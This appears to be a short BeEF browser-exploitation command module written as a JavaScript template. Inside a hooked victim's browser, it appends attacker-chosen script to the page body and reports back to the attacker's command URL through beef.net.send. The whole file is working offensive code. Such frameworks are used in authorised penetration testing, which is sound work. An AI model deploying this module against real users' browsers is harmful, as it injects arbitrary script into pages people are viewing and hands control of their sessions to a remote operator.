beef.execute(function() {
	//get innerHTML of the body and concatenate the script to run
	var tmp = document.body.innerHTML;
	tmp = tmp + "<%= @javascript_inject %>";
	document.body.innerHTML = tmp
	
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Inserted: <%= @javascript_inject %>');
})